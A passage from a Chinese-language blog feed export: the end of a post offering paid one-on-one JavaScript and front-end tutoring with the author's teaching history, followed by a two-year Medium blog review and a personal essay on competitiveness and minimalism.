title="怎樣的人適合報名？"></a>怎樣的人適合報名？</h4><p>上面寫的那些主題比較單一，而且真的想學的話我認為透過其他資源也可以學，家教其實不是那麼有優勢。我的意思是，家教還是可以幫到忙，但能幫得沒那麼多。</p><p>那怎樣的人我覺得比較能幫助到呢？</p><p>第一，有程式基礎，想做一個小專案但不知道從何下手的人。例如說今天想做一個電商網站，寫過一點前端，可是從來沒碰過後端。對完全沒做過這種專案的人來說，「從何下手」以及「需要哪些技術」是最難的，而且答案不好找。</p><p>這種的話我就覺得滿適合找家教，有人在你旁邊直接提點你想做這個專案需要學哪些東西，幫你系統性地去拼湊出整個專案的樣貌。</p><p>第二，寫 code 常常碰到問題卻找不出解法的人。</p><p>家教的好處就是：「你可以在旁邊看我 debug」，我會邊 debug 邊跟你說：「如果是我的話，我會這樣做」，所以你可以在旁邊學到 debug 技巧，學到該怎麼縮減問題範圍，怎麼猜測問題在哪裡，怎麼去測試以及找出答案。</p><p>第三，對 JavaScript 核心概念很不熟，面試常常碰壁的人。</p><p>JavaScript 面試中最常考的不外乎就幾個概念：hoisting、this、prototype、scope、closure 以及我最討厭的 coercion。除了 coercion 我還沒花時間去研究以外，其他幾個概念都有花過不少時間在上面，之前也有寫成文章分享。</p><p>但有時候看文章還是會有些無法理解的地方，如果有人在旁邊可以問的話，能夠立刻解惑，也能夠立刻補充一些其他觀念，我覺得還滿不錯的。</p><p>第四，覺得自己對於程式解題一點基礎都沒有，去看演算法與資料結構也完全看不懂的人。</p><p>我覺得有些新手在這方面的 sense 滿差的，不用談到那些經典演算法題目，連最簡單的判斷質數或是找中位數可能都寫不太出來。這方面我覺得要從最基礎開始帶，從頭開始慢慢培養對程式解題的觀念跟敏感度，先把那些最簡單的題目寫出來，才開始慢慢進入到經典演算法題。</p><p>第五，已經有程式基礎但想要快速進步的人。</p><p>例如說你已經會寫 Vue，然後想要快速學會 React，這時候我就可以帶著你學，順便讓你看看一般的 React 專案可能會有的架構以及使用到的其他工具，會比自己摸索來得快。</p><p>第六，完全沒有基礎，想要花錢省時快速進步的人。</p><p>一對一家教是最花錢但也是最省時間的方式。因為直接有一個老師在旁邊教你，同時也跟你說要學什麼，讓你省去那些查資料以及迷惘的時間。</p><p>以上我自己想了幾種我覺得滿適合的對象，但不一定要是這些對象才可以報名。其實只要跟 JS 或是前端有關的（Vue 跟 Angular 不行，我真的一點都不會，抱歉）都可以來找我學，在這方面我還算是有自信。</p><h4 id="預期中教學方式"><a href="#預期中教學方式" class="headerlink" title="預期中教學方式"></a>預期中教學方式</h4><p>如果你是帶著問題來找我的，我會邊試著解問題邊跟你說我現在在嘗試的方法，以及我腦中想到的方向大概為何，這樣你才能學習到如何解決問題，而不是只會解決「這個問題」。</p><p>舉例來說，可能會像這樣：「我目前看了一下這個問題，我猜有可能是 A 到 B 這一段出錯，所以我們現在要先把不相干的東西都排除，確認一下是不是真的是這一段。對，現在確認是這一段了，那接著就可以來想想 A 到 B 中間有 A1, A2, A3，到底是哪一段出問題，這邊我們先….」</p><p>若是你想學習某個特定主題，或者是單純想要學程式，那我會先幫你規劃一套課綱，討論過後我們就跟著課綱一起進行課程。課綱可以根據您的興趣做調整，例如說你想學爬蟲我們就爬蟲多一點，想學網頁我們就網頁的課程多一點之類的。</p><p>過程中我覺得需要教學的地方我會直接教，但能引導的地方我絕對用引導的，真的不行的話才手把手教學。</p><h4 id="地點、頻率與期望薪資"><a href="#地點、頻率與期望薪資" class="headerlink" title="地點、頻率與期望薪資"></a>地點、頻率與期望薪資</h4><p>有關於地點的話，基本上只要公車捷運可到的地方都方便。但如果通勤時間要一個小時以上的話（我家住中和）那就有點遠，例如說台北市的南港、內湖或是新北市的新莊、三重之類的，我就必須要再考慮看看。</p><p>還有另外一種選擇就是線上，這個也很方便，不過如果能實體的話當然還是實體最方便啦。</p><p>頻率的話我很 free，其實都 ok，你要碰到問題的時候才來找我，或者是固定每週一次兩小時、每週兩次四小時都可以。但長期的會優先考慮啦，畢竟對我來說比較方便。</p><p>期望薪資是<strong>時薪 1500 元以上</strong>，會寫「以上」是因為在報名表單裡面大家可以填寫自己願意支付的時薪，<strong>出價高的會優先聯絡。</strong>所以如果你真的很想參與的話就填高一點，只是想碰個運氣的話就寫 1500 就行了。</p><p>另外，教學對象不限，無論你有沒有程式基礎都可以。年齡也不限，教國小國中的小朋友或是教已經在工作的工程師都行。總之在表單裡面會讓大家填寫需要教學的內容，我會評估自己的能力是不是能負擔得起。</p><p>然後標題雖然寫一對一，但其實一對二或一對三我也都可以。如果不是一對一的，可以在報名表單裡面的「其他」註明。</p><h4 id="如何報名"><a href="#如何報名" class="headerlink" title="如何報名"></a>如何報名</h4><p>（2020–01–20 更新：此活動已截止）</p><p>裡面會有一些基本資訊要您填寫，大概過一兩週之後我會開始聯絡。前面有講過，會依照願意支付薪資的高低順序聯絡，預計會收三到五個學生，如果沒有連絡到的就先說聲不好意思，可能就是額滿了。</p><p>以上是家教相關的一些說明以及報名表單，底下是我的教學相關經歷。</p><p>工作資歷請參考：<a href="https://www.linkedin.com/in/hulii/">Linkedin</a>。</p><h4 id="教學相關理念"><a href="#教學相關理念" class="headerlink" title="教學相關理念"></a>教學相關理念</h4><ol><li><a href="/2019/05/10/how-to-answer-question-eef8802126b3/">如何幫助學生解決程式問題？我認為的好方法跟壞方法</a></li><li><a href="/2019/04/13/before-learning-b9b933b6078e/">學程式的第零課：心態調整</a></li><li><a href="/2018/10/29/learn-coding-9c572c2fb2/">當我們在學程式時，要學的到底是什麼？</a></li></ol><h3 id="教學相關資歷"><a href="#教學相關資歷" class="headerlink" title="教學相關資歷"></a>教學相關資歷</h3><h4 id="程式導師實驗計畫第三期：2019-年-4-月～至今"><a href="#程式導師實驗計畫第三期：2019-年-4-月～至今" class="headerlink" title="程式導師實驗計畫第三期：2019 年 4 月～至今"></a>程式導師實驗計畫第三期：2019 年 4 月～至今</h4><p>學生 50 人左右，經由六個月的教學希望能把學生從無到有培養成一個合格的工程師。這一期新增了自製的學習系統以及跟學生合作了幾個有趣的小專案，也寫了一些技術白話文。</p><p>課程大綱：<a href="https://github.com/Lidemy/mentor-program-3rd">https://github.com/Lidemy/mentor-program-3rd</a><br>心得：<a href="/2019/05/29/from-online-to-offline-bd99e545277a/">從線上到線下：第三期教學實驗滿月心得分享</a></p><h4 id="程式導師實驗計畫第二期：2018-年-8月～2019-年-1-月"><a href="#程式導師實驗計畫第二期：2018-年-8月～2019-年-1-月" class="headerlink" title="程式導師實驗計畫第二期：2018 年 8月～2019 年 1 月"></a>程式導師實驗計畫第二期：2018 年 8月～2019 年 1 月</h4><p>延續第一期的計畫做了優化以及調整，新增了淘汰制以及每日進度報告的制度，目標一樣為四個月內培養出能找到工作的學生。學生人數共 38 人，最後有 27% 的學生找到工作。</p><p>課程大綱：<a href="https://github.com/Lidemy/mentor-program-2nd">https://github.com/Lidemy/mentor-program-2nd</a><br>心得：<br>1. <a href="/2018/11/04/mentor-program-2nd-mid-c7539f67b7d7/">這是一堂沒那麼適合初學者的課程 — — 程式導師實驗計畫第二期期中反思</a><br>2. <a href="/2019/01/21/mentor-program-2nd-review-e7c15f24dfb8/">四個月過去了，來找我學程式的學生們怎麼樣了？</a><br>3. <a href="/2019/03/13/mentor-program-2nd-result-3cb7c2b6627e/">27% 的人找到工作 — — 程式導師實驗計畫第二期成果報吿</a></p><h4 id="程式導師實驗計畫第一期：2018-年-1-月～2018-年-6月"><a href="#程式導師實驗計畫第一期：2018-年-1-月～2018-年-6月" class="headerlink" title="程式導師實驗計畫第一期：2018 年 1 月～2018 年 6月"></a>程式導師實驗計畫第一期：2018 年 1 月～2018 年 6月</h4><p>為期四個月的實驗計畫，學生必須每週投入 40 小時學習，最終目標是找到工作成為工程師，教學內容前後端皆有，後端主要教 PHP + node.js，前端則是 React + Redux，學生人數為 12 人，2 人順利轉職。</p><p>課程大綱： <a href="https://github.com/Lidemy/mentor-program">https://github.com/Lidemy/mentor-program</a><br>心得：<a href="/2018/06/26/mentor-program-review-a9c6668dfb/">程式導師實驗計畫第一期成果與心得</a></p><h4 id="CS50-課程導讀：2017-年-7-月～2017-年-10-月"><a href="#CS50-課程導讀：2017-年-7-月～2017-年-10-月" class="headerlink" title="CS50 課程導讀：2017 年 7 月～2017 年 10 月"></a>CS50 課程導讀：2017 年 7 月～2017 年 10 月</h4><p>國外的知名課程 CS50 一直是我學習的目標，它幫程式課程樹立了一個很好的標竿及榜樣，但有鑒於難度太高以及語言問題，因此我發起了每週一次直播講解 CS50 課程的活動，也經營了目前社團人數 6000 人的 CS50 中文討論區。直播完後把影片放到 Lidemy 上，學生人數為 1800 人。</p><p>心得：<a href="https://medium.com/@lidemy/cs50-2016-review-f256d20dd70c">CS50 2016 課程導讀心得</a></p><h4 id="從新手到中手：前端工程加強班：2017-年-4-月～2017-年-6-月"><a href="#從新手到中手：前端工程加強班：2017-年-4-月～2017-年-6-月" class="headerlink" title="從新手到中手：前端工程加強班：2017 年 4 月～2017 年 6 月"></a>從新手到中手：前端工程加強班：2017 年 4 月～2017 年 6 月</h4><p>一共十堂的免費課程，教學方式為學生先寫作業，老師每週一次直播講解作業並教學，當時參與人數有 26 人，課程內容包括 Ajax, Webpack, Gulp, ESLint 與 CSS preprocessor。直播完後把影片放上課程平台，學生人數約為 1000 人。</p><p>課程大綱： <a href="https://github.com/aszx87410/frontend-intermediate-course">https://github.com/aszx87410/frontend-intermediate-course</a><br>心得： <a href="http://huli.logdown.com/posts/1913623-frontend-tutorial-experiment">一場三十人的免費程式教學實驗：成果與檢討</a></p><h4 id="初心者的計概與-coding-火球術：2016-年-9-月～2018-年-9-月"><a href="#初心者的計概與-coding-火球術：2016-年-9-月～2018-年-9-月" class="headerlink" title="初心者的計概與 coding 火球術：2016 年 9 月～2018 年 9 月"></a>初心者的計概與 coding 火球術：2016 年 9 月～2018 年 9 月</h4><p>在 Hahow 開設的線上課程，總長約為 6 小時，學生人數 600 人，課程內容為比較有趣的計算機概論，涵蓋計算機概論、網路、資訊安全、演算法、程式設計等多個領域。</p><p>課程連結：<a href="https://hahow.in/courses/57430175fad4ef0a006be4cf/main">https://hahow.in/courses/57430175fad4ef0a006be4cf/main</a></p><h4 id="台北免費程式教學：2015-年-10-月～2015-年-12-月"><a href="#台北免費程式教學：2015-年-10-月～2015-年-12-月" class="headerlink" title="台北免費程式教學：2015 年 10 月～2015 年 12 月"></a>台北免費程式教學：2015 年 10 月～2015 年 12 月</h4><p>自主發起的一對一線下諮詢服務，時間約一小時到兩小時不等，可以詢問任何跟程式相關的問題，問題多為初學者如何入門以及產業概觀，參與人數 7 人。</p><p>心得：<a href="https://github.com/aszx87410/programming-tutorial-review">https://github.com/aszx87410/programming-tutorial-review</a></p><h3 id="技術部落格"><a href="#技術部落格" class="headerlink" title="技術部落格"></a>技術部落格</h3><h4 id="Huli’s-blog（medium）"><a href="#Huli’s-blog（medium）" class="headerlink" title="Huli’s blog（medium）"></a>Huli’s blog（medium）</h4><p>從 2017 年 10 月開始經營，內容為科技、職涯相關或是程式學習經驗分享，技術文章則偏科普類，適合一般人或是初學者閱讀，總瀏覽次數約 60 萬。</p><p>範例文章：</p><ol><li><a href="/2018/06/10/frontend-engineer-guide-297821512f4e/">零基礎的小明要如何成為前端工程師？</a></li><li><a href="/2019/06/20/ramen-and-api-6238437dc544/">從拉麵店的販賣機理解什麼是 API</a></li><li><a href="/2019/08/09/session-and-cookie-15e47ed838bc/">白話 Session 與 Cookie：從經營雜貨店開始</a></li></ol><h4 id="TechBridge-技術共筆部落格"><a href="#TechBridge-技術共筆部落格" class="headerlink" title="TechBridge 技術共筆部落格"></a><strong>TechBridge 技術共筆部落格</strong></h4><p>從 2016 年 3 月開始經營，是與三個朋友合寫的部落格，每個月固定要寫一篇，多為技術相關的文章，總瀏覽次數約 100 萬。</p><p>範例文章：</p><ol><li><a href="https://github.com/aszx87410/blog/issues/49">JavaScript 中的同步與非同步（上）：先成為 callback 大師吧！</a></li><li><a href="https://github.com/aszx87410/blog/issues/39">淺談 JavaScript 頭號難題 this：絕對不完整，但保證好懂</a></li><li><a href="https://github.com/aszx87410/blog/issues/34">我知道你懂 hoisting，可是你了解到多深？</a></li></ol><h4 id="Huli’s-blog（logdown）"><a href="#Huli’s-blog（logdown）" class="headerlink" title="Huli’s blog（logdown）"></a><strong>Huli’s blog（logdown）</strong></h4><p>從 2014 年 3 月擔任實習生時期開始經營，內容不拘但早期多為個人程式筆記，後期為技術文章，總瀏覽次數約 150 萬。</p><h4 id="Half-Stack-Developer-養成計畫"><a href="#Half-Stack-Developer-養成計畫" class="headerlink" title="Half-Stack Developer 養成計畫"></a><strong>Half-Stack Developer 養成計畫</strong></h4><p>一系列共 30 篇的文章，內容涵蓋前後端相關技術，包括 HTML, CSS, JavaScript, jQuery, SCSS, Bootstrap, babel, Gulp, Webpack, Express, React, Redux 與 nginx，訂閱人數 116 人，獲得 2017 iT 邦幫忙鐵人賽優選。</p><p>以上是教學相關資歷以及寫過的技術文章</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Medium 經營兩週年之隨意回顧</title>
      <link href="/2019/11/17/two-year-review-e029ac415a12/"/>
      <url>/2019/11/17/two-year-review-e029ac415a12/</url>
      
        <content type="html"><![CDATA[<p>原本沒有注意到已經經營兩週年了，是在回顧文章的時候突然看到去年寫的<a href="/2018/11/15/one-year-review-2963f072572d/">《一週年報告：在 Medium 上寫程式與科技類文章的成效如何？》</a>才發現的。</p><p>但這一年來其實也沒有什麼特別的心得，大致上都跟去年差不多，不過還是想要寫一篇來記錄一下這一年間發生的事情。因此比起心得，這篇會更像是給自己看的回顧文，檢視一下在這期間我發了哪些文章，做了哪些事。</p><p>先回顧一下去年那篇統計出來的數據：</p><p>24 篇文章，2600 個追隨者，45000 個拍手，20 萬瀏覽次數。</p><p>今年加去年累積的數據則是：</p><blockquote><p>55 篇文章（+129%）</p></blockquote><blockquote><p>6000 個追隨者（+130%）</p></blockquote><blockquote><p>60 萬瀏覽次數（+200%）</p></blockquote><p>拍手次數因為懶惰所以沒有統計。如果你對這些數據有興趣，可以參考<a href="https://docs.google.com/spreadsheets/d/1jALCYlWoH2lBDNRB8NfdrMSHmtzwPRNHGfZ-rSURfCw/edit?usp=sharing">這份檔案</a>，裡面有我所有文章的數據（就是 stats 可以看到的那些）。</p><p>接著來回顧自己今年做了哪些事。</p><h3 id="持續發表教學心得及成果相關文章"><a href="#持續發表教學心得及成果相關文章" class="headerlink" title="持續發表教學心得及成果相關文章"></a>持續發表教學心得及成果相關文章</h3><p>先從老本行開始談起。</p><p>我每隔兩三個月就會 po 一些與程式教學相關的心得文或者是成果，這一年也不例外，底下是其中一些範例：</p><ol><li><a href="/2019/01/21/mentor-program-2nd-review-e7c15f24dfb8/">四個月過去了，來找我學程式的學生們怎麼樣了？</a></li><li><a href="/2019/02/05/qa-be72946f0b23/">程式相關問題一網打盡：談自學、轉職、出國、職涯、教學、補習、騙錢、產業以及努力</a></li><li><a href="/2019/03/13/mentor-program-2nd-result-3cb7c2b6627e/">27% 的人找到工作 — — 程式導師實驗計畫第二期成果報吿</a></li><li><a href="/2019/05/29/from-online-to-offline-bd99e545277a/">從線上到線下：第三期教學實驗滿月心得分享</a></li></ol><p>因為我的教學實驗計畫是每半年一期，所以開始招生的時候固定會有一篇招生簡介文，結束的時候也固定會有一篇心得成果文，中間會有一篇以上的中場心得，所以加一加最少會有三篇。</p><p>其他的教學相關心得則是有靈感的時候才會寫，或是有些問題如果被問太多遍，也會盡可能寫成文章，之後就叫問的人去看文章就好。</p><h3 id="持續發表技術白話科普文"><a href="#持續發表技術白話科普文" class="headerlink" title="持續發表技術白話科普文"></a>持續發表技術白話科普文</h3><p>我相信很多技術相關的名詞或者是概念，都可以用淺顯易懂且生活化的方式來講解，而不是只會用一大堆專有名詞來做名詞解釋。</p><p>在教學的過程中，可以注意到大多數學生會卡在幾個特定的概念，這些概念就會被我優先放入寫作清單當中，試著用自己的能力把這個概念講得更清楚。</p><p>今年一共寫了三篇文章講解三個不同的觀念：API、Session 與 Cookie，還有基本網路概念。</p><ol><li><a href="/2019/06/20/ramen-and-api-6238437dc544/">從拉麵店的販賣機理解什麼是 API</a></li><li><a href="/2019/08/09/session-and-cookie-15e47ed838bc/">白話 Session 與 Cookie：從經營雜貨店開始</a></li><li><a href="/2019/09/25/learning-tcp-ip-http-via-sending-letter-5d3299203660/">從傳紙條輕鬆學習基本網路概念</a></li></ol><h3 id="多了更多旅遊相關文章"><a href="#多了更多旅遊相關文章" class="headerlink" title="多了更多旅遊相關文章"></a>多了更多旅遊相關文章</h3><p>除了原本就一直有在寫的教學與技術相關文章以外，今年因為開始放長假的緣故，也多了很多旅遊相關文章。以前出國自助遊的時候我會帶著電腦，每天寫一篇遊記，稍微記了一下去哪裡然後拍拍照片之類的，但後來發現這樣好累，於是就比較少做這種事。</p><p>這次則是剛好參加了 iT 邦鐵人賽，所以每天<a href="https://ithelp.ithome.com.tw/users/20091346/ironman/2621">隨意寫一點遊記</a>外加看別人技術文章的心得。</p><p>底下幾篇是旅遊寫下的心得文：</p><ol><li><a href="/2019/06/01/jgc-and-jal-ctystal-862f2bb4af8b/">非典型微 JGC 修行（JMB 水晶卡）之旅</a></li><li><a href="/2019/10/14/etihad-a380-auh-icn-first-class-352fdbbc08db/">EY876 AUH-ICN A380 阿提哈德頭等艙體驗心得</a></li><li><a href="/2019/07/13/travel-part1-46e50a306467/">旅行的意義（上）：寫在遊日本、越南與美國後</a></li><li><a href="/2019/10/31/travel-part2-818482a90bc9/">旅行的意義（下）：寫在遊阿布達比、歐洲與韓國後</a></li></ol><h3 id="接到業配啦"><a href="#接到業配啦" class="headerlink" title="接到業配啦"></a>接到業配啦</h3><p>身為這種都是教學或技術文的部落客，本來就不預期會接到什麼業配，因為也沒什麼東西可以業配，好像行銷或是商業相關的主題比較容易，或者是那種寫讀書心得的，好像常常會拿到一些書。</p><p>不過我萬萬沒想到，第一個接到的業配居然是英文！後來發現工程師好像本來就是個對英文學習很有興趣的族群，仔細想想來找我業配也是有點合理。</p><p>總之業配文我一定標明是業配，然後心得也是完全真實。比起「業配」這個詞，我比較喜歡「與廠商合作」之類的字眼，廣告嫌疑好像不會那麼重。畢竟我的心得就是真的使用的心得，而不是廠商叫我寫的。</p><p>目前唯一一篇與廠商合作的文章：<a href="/2019/04/09/voicetube-hero-review-9409c2248845/">「真正的」看影片學英文：VoiceTube HERO 使用心得</a>。</p><p>有其他相關的合作機會也歡迎來找我 😂</p><h3 id="談論-Medium-出走潮"><a href="#談論-Medium-出走潮" class="headerlink" title="談論 Medium 出走潮"></a>談論 Medium 出走潮</h3><p>六月的時候看到一些國外的文章講到了 Medium 政策的轉變以及一些大咖紛紛離開 Medium，稍微調查了之後寫下：<a href="/2019/06/04/freecodecamp-hackernoon-are-leaving-medium-1b7319d7a8a7/">Medium 出走潮：freeCodeCamp 與 Hacker Noon 相繼離開，為什麼？</a></p><p>後來有引起了一些社群的討論跟關注，不過那時我也沒有決定之後要怎麼辦，就想說繼續待著好了。</p><p>如今過了五個月，我還是暫時不會想離開 Medium，因為這邊對我來說還是一個足夠舒服的平台。我只要管寫作就好了，其他都不用管。</p><h3 id="發布-Medium-中文寫作者相關統計資料"><a href="#發布-Medium-中文寫作者相關統計資料" class="headerlink" title="發布 Medium 中文寫作者相關統計資料"></a>發布 Medium 中文寫作者相關統計資料</h3><p>七月的時候寫了這篇：<a href="/2019/07/02/medium-analysis-40752b9efa03/">Medium 中文寫作者追蹤人數排名與不專業數據分析</a>，那時候自己的追蹤人數排在第十二名。發出去之後跟預料中的差不多，滿多人轉貼的，而且有在榜上的人通常都會轉貼一下，所以擴散的還不錯，排行榜上的作者追蹤人數都有增加，而我的則是增加最多的。</p><p>以最新的數據來看，我的追蹤人數大約是 6000 人，變成第七名了，上升了五個名次，可喜可賀，可喜可賀。</p><p>話說我大概從幾個月前就開始不把文章加進 Publication，主要原因是不想分散追蹤人數。如果加進去的話，看文章時左側的 Follow 就會追蹤 Publication 而不是個人，而我的 Publication 也沒有特別設置什麼，覺得不放進去也沒差。</p><p>像是我的 Publication 有 2000 個追蹤人數，雖然不知道跟個人帳號的重疊度高不高，但一定有分散個人帳號的追蹤。</p><p>不過先前已經放進去的我也沒有移出來，因為我不確定網址的重新導向有沒有做好，沒有的話就麻煩了，所以想說就放著，新的不要加進去就好。</p><h3 id="自製-Medium-文章列表"><a href="#自製-Medium-文章列表" class="headerlink" title="自製 Medium 文章列表"></a>自製 Medium 文章列表</h3><p>Medium 內建的文章列表實在是有點爛，舊的文章很難被人看見，因此我就自製了一個文章列表：<a href="https://aszx87410.github.io/blog/medium">https://aszx87410.github.io/blog/medium</a>，寫過的文章一目了然。</p><p>現在在寫這篇回顧文的時候，也是靠著這個列表，一眼就可以看出到底發過什麼文章。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>過了一年，Medium 本身也有了一些改變，例如說現在有選項可以設置 canonical link，不用怕文章重複造成的 SEO 問題；分潤的計算機制也改變了，但我沒有文章在付費牆裡面所以不受影響。</p><p>雖然一度有考慮過離開 Medium，但目前為止在這邊的體驗都還算不錯，沒有一定得離開的理由，所以會繼續待著。</p><p>話說做回顧有趣的點就在於沒有回顧之前，你不會意識到自己之前做了什麼。每次回顧前我都會覺得自己好像沒做什麼，但回顧後會發現：「咦，怎麼感覺也做了不少事」。</p>]]></content>
      
      
      <categories>
          
          <category> 寫作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寫作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>或許有天，我會歸隱山林</title>
      <link href="/2019/11/15/someday-i-will-a5aede6d30e2/"/>
      <url>/2019/11/15/someday-i-will-a5aede6d30e2/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/someday-i-will-a5aede6d30e2/1__6uEL3V6WSq44IFEVRhGFow.jpeg"></p><p>想寫這篇一陣子了，但害怕沒辦法完整表達自己的想法於是遲遲沒有動手。</p><p>若是一直這樣下去，可能永遠都不會開始寫吧，因為永遠都沒有「覺得自己可以完整表達」的那一天。</p><p>沒差，反正文章主要是寫給自己看的，先寫了再說。</p><p>先來講一下為什麼會有這篇文章好了，這是之前去<a href="/2019/07/13/travel-part1-46e50a306467/">日本旅遊</a>的時候在思考的東西，但跟日本沒什麼關係，純粹是因為旅遊放空所以比較容易思考一些問題，而且把時間拉長可以想得更仔細一點。</p><p>那時我一直在想一個問題：</p><blockquote><p>我在（職涯上）追求的是什麼？</p></blockquote><p>是薪水嗎？好像每次換工作薪水就要更高。是地位嗎？往更好的公司跳，證明自己比較厲害…等一下，可是為什麼在更好的公司就能證明自己比較厲害？或者說，厲不厲害這種事情，只能靠「進去更好的公司」來證明嗎？</p><p>聽起來好像有點合理，畢竟人人都可以說自己很厲害，但是有個客觀的證據才能佐證這件事。也不一定要是待在厲害的公司，也可以是做過的事情很厲害或是完成的作品很猛之類的。</p><p>談到「證明自己」這件事，在<a href="/2019/02/05/qa-be72946f0b23/">《程式相關問題一網打盡：談自學、轉職、出國、職涯、教學、補習、騙錢、產業以及努力》</a>有提到我做教學的理由：</p><blockquote><p><em>我做教學最主要的目的不是為了幫你實現你的夢想，不是為了賺你錢，也幾乎不管你到底為什麼想當工程師，也不管這個產業之後會如何，我覺得那些不關我的事。</em></p></blockquote><blockquote><p><em>我想做的只是自我實現，想證明我很能教，證明我的教學比任何人都厲害。</em></p></blockquote><p>這可以從兩個方向去談。</p><p>第一個是，如果證明不了呢？如果這是一條永無止盡的路呢？或許可以證明在 A 上面你比較強，但 B 呢？C 呢？會不會永遠不可能達成這件事？會不會「壓倒性的勝利」在某些領域是不可能的？</p><p>第二個是，證明自己有那麼重要嗎？為什麼要證明自己？是因為要透過外部來肯定自己的價值嗎？這些東西是不是沒辦法從內在產生？</p><p>我原本以為我已經滿「出世」的了，而且脫離了滿多人的那種「單一成功價值觀」，例如說薪水高就是比較厲害，當醫生就是比種田好。</p><p>但當我仔細想想之後，才發現自己好像沒有脫離這種我不喜歡的思維，因為我仍然在追求更高的薪水，更好的公司，暗自覺得這樣比較「成功」，這樣能夠證明自己比較厲害。</p><p>可是一旦有了這種競爭思維，會發現這是永無止盡的，這是永遠都走不完的一條路。想到這邊就覺得好絕望喔，為什麼我要卡在一個我不想待的無窮迴圈裡面，我不想這樣。</p><p>之前有跟朋友聊過這問題，他覺得這取決於你做這件事情的目的是什麼。比如說我當工程師跟薪水無關，只是純粹喜歡寫程式。所以不是因為薪水高才去當工程師，而是當了工程師所以薪水高。公司也是，我只是想找一個更好的、更有挑戰性的環境讓我發展，而不是為了薪水才進去。</p><p>可是一旦我開始做這件事，就會有想要跟別人競爭的心情，我也不知道為什麼。</p><p>一開始會思考這個問題其實是因為那陣子看到好多臉書廣告，都是那種什麼旅美工程師的分享講座之類的，講說自己怎麼進 FAANG，然後講者的簡介看起來都很厲害之類的。</p><p>在街上隨意找路人評比我跟他們，應該十個裡面會有九個會覺得進去 FAANG 的他們比較厲害，但我自己覺得我不會比他們差。大概就是一種不服輸的心態吧？我也不知道。甚至我也不知道為什麼我要拿自己跟他們比較。</p><p>這個前面講過了，我以為我跳脫了卻沒有，我還處在那種「單一成功價值觀」，只是「單一」的定義不一樣而已。</p><p>總之想著想著就覺得好煩喔，好像只有幾種選擇。要嘛就是認清自己就是那麼愛競爭那麼好勝，然後不斷往上爬。但這就是永無止盡的，永遠都有更高的地方在等著你，想到這邊就覺得好累。</p><p>第二種就是果斷放棄，不要爭了，有什麼好爭的。</p><p>那就歸隱山林吧，找個地方種種田泡泡茶什麼的，過著養老的生活。</p><p>不過說起來簡單，事實上也只是「幻想出來的歸隱山林」而已，很有可能根本沒那麼簡單，而且有可能那種生活我也過不太下去。</p><p>在教學的時候，我的學生們也會有互相比較的心態，看到很多同學進度都在前面但自己卻落後，就會覺得自己是不是比較弱？是不是沒辦法轉職成功？我都告訴他們說：「好好看著自己就好」，只要每天都有在成長就好了，其他的都不重要。</p><p>但「好好看著自己」其實也是一件困難的事，因為無論你想不想，有時候就是會被周遭給干擾，就是沒辦法只看著自己。</p><p>之前去<a href="https://www.hexschool.com/">六角學院</a>分享的時候，校長洧杰被問到關於競爭對手的看法時，是這樣說的（非原話，但大意差不多）：</p><blockquote><p><em>「六角沒有競爭對手。你們以為的競爭對手，對六角而言都是合作對象。我希望六角的學生接觸到更多好的資源，所以有好的講師都請推薦給我，我會找他們來分享。在六角眼中沒有競爭對手，只有學生。」</em></p></blockquote><p>我聽到這段話的時候真的是覺得高下立判，當我還在把所有其他程式課程當作潛在對手，想要做出「最好的教學」，證明我的教學比任何人都厲害的時候，六角只把目光放在學生身上，想著怎麼讓學生更好。</p><p>這個出發點就很不一樣了，我的目標是做出厲害的教學，而這厲害的教學連帶會讓學生變得更好；而六角是從「怎麼讓學生變得更好」為出發點，再去想說要做什麼。</p><p>雖然以結果來看，學生都會變得更好，但總感覺洧杰那樣的想法高度更高，看到的東西能夠更廣。</p><p>好，寫到這邊不知道怎麼收尾，那乾脆就不收了吧。總之這篇就是記錄一些零碎的想法，因為我自己也還沒完全想清楚（或許也沒有那一天）。</p><h4 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h4><p>在我寫這篇不知所云的文章過了一兩個月以後，我偶然間接觸到了<a href="https://www.netflix.com/title/80114460">極簡主義</a>，發現我還滿喜歡且認同那樣的想法，雖然看似與這篇文章的主題沒什麼關係，但其實不然。</p><p>在看極簡主義的紀錄片的時候，裡面提到現在的社會風氣被塑造成要追求更好的物質生活——儘管你從未想過是否真的需要，所以極簡主義讓自己從這些物質生活中解脫，把那些不重要的東西通通丟掉，只留下必要的。</p><p>我覺得這樣做也是一種「歸隱山林」，而且是心境上的歸隱。如果能夠把社交平台也一起丟掉的話，好像就看不到那些競爭對象，就沒有競爭的問題了（眼不見為淨？），也能夠好好地看著自己。不過有好有壞啦，沒有競爭的話，搞不好進步也會變緩慢，或是一個懶惰的話也有可能毫無進步。</p><p>總之我也開始丟東西，把手機裡的 App 跟照片也幾乎刪光了，IG 也刪一週了，覺得越丟越開心，好像所有包袱都不見了，之後也預計要把 Facebook 還有 Messenger 一起砍掉。總之我滿喜歡現在的生活，或許等過一陣子可以再跟大家分享我到底丟了哪些東西以及有了哪些影響。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隨意談看學生求職心得感想</title>
      <link href="/2019/11/11/about-interview-95bfaa4273ba/"/>
      <url>/2019/11/11/about-interview-95bfaa4273ba/</url>
      
